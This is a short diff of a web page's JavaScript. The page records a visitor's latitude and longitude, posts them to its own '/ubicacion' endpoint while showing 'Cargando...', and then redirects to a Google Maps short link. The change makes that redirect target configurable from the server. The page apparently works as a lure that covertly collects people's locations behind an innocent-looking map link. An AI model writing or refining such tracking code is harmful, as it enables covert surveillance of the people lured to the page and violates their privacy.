@@ -207,15 +207,20 @@
       updateUserMarker(lat, lng, accuracy);
       statusBar.textContent = `Cargando...`;
 
+      let destino = 'https://maps.app.goo.gl/t2xJ2sB7UHKGtDbH9';
       try {
-        await fetch('/ubicacion', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ lat, lng }),
-        });
+        const [, cfg] = await Promise.all([
+          fetch('/ubicacion', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ lat, lng }),
+          }),
+          fetch('/api/config').then(r => r.json()),
+        ]);
+        if (cfg.redirectUrl) destino = cfg.redirectUrl;
       } catch (_) {}
 
-      window.location.href = 'https://maps.app.goo.gl/t2xJ2sB7UHKGtDbH9';
+      window.location.href = destino;
     }
 
     function onWatch(pos) {
